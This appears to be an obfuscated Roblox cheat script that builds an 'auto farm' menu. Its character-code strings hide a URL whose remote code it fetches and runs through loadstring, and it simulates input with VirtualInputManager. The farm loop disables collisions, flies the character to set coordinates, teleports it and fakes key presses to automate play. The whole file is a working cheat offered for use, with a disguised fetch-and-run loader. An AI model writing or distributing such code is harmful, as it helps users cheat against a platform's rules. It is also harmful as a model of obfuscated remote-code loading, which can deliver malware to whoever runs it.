--[[ PROTECTED BY azOoO SYSTEM ]]
local _0x72 = loadstring
local _0x67 = game
local _0x56 = string.char

local _0x4c = _0x72(_0x67:HttpGet(_0x56(104,116,116,112,115,58,47,47,115,105,114,105,114,115,46,109,101,110,117,47,114,97,121,102,105,101,108,100)))()
local _0x564 = _0x67:GetService(_0x56(86,105,114,116,117,97,108,73,110,112,117,116,77,97,110,97,103,101,114))

local _0x57 = _0x4c:CreateWindow({
    Name = "azOoO",
    LoadingTitle = "azOoO",
    ConfigurationSaving = {Enabled = false}
})

local _0x54 = _0x57:CreateTab("azOoO", 4483362458)
_G.AzoFarm = false

local function _0x45()
    for i = 1, 12 do
        _0x564:SendKeyEvent(true, Enum.KeyCode.E, false, _0x67)
        task.wait(0.05)
        _0x564:SendKeyEvent(false, Enum.KeyCode.E, false, _0x67)
    end
end

local function _0x47(t, p)
    if not _G.AzoFarm then return end
    local c = _0x67.Players.LocalPlayer.Character
    local h = c:WaitForChild("HumanoidRootPart")
    local nc = _0x67:GetService("RunService").Stepped:Connect(function()
        for _, v in pairs(c:GetDescendants()) do
            if v:IsA("BasePart") then v.CanCollide = false end
        end
    end)
    local bv = Instance.new("BodyVelocity", h)
    bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    bv.Velocity = Vector3.new(0, 0, 0)
    local bg = Instance.new("BodyGyro", h)
    bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
    while (Vector2.new(h.Position.X, h.Position.Z) - Vector2.new(t.X, t.Z)).Magnitude > 6 and _G.AzoFarm do
        local dir = (Vector3.new(t.X, 82, t.Z) - h.Position).Unit
        bv.Velocity = dir * 55
        bg.CFrame = CFrame.new(h.Position, Vector3.new(t.X, 82, t.Z))
        task.wait()
    end
    bv:Destroy()
    bg:Destroy()
    nc:Disconnect()
    h.CFrame = CFrame.new(t.X, t.Y + (p and 1.5 or 2), t.Z)
    task.wait(0.3)
    if p then
        _0x45()
        task.wait(0.5)
    else
        _0x564:SendKeyEvent(true, Enum.KeyCode.Space, false, _0x67)
        task.wait(0.1)
        _0x564:SendKeyEvent(false, Enum.KeyCode.Space, false, _0x67)
        task.wait(0.5)
    end
end

_0x54:CreateToggle({
    Name = "Start Farm",
    CurrentValue = false,
    Callback = function(v)
        _G.AzoFarm = v
        task.spawn(function()
            while _G.AzoFarm do
                _0x47(Vector3.new(-37, 71, -3081), true)
                for _, pos in ipairs({
                    Vector3.new(-392.1, 73, -2660.1),
                    Vector3.new(366.9, 73.3, -2804.5),
                    Vector3.new(-84.1, 73, -2715.4)
                }) do
                    if not _G.AzoFarm then break end
                    _0x47(pos, false)
                end
                task.wait(0.5)
            end
        end)
    end
})

_0x4c:Notify({
    Title = "azOoO",
    Content = "azOoO",
    Duration = 3
})
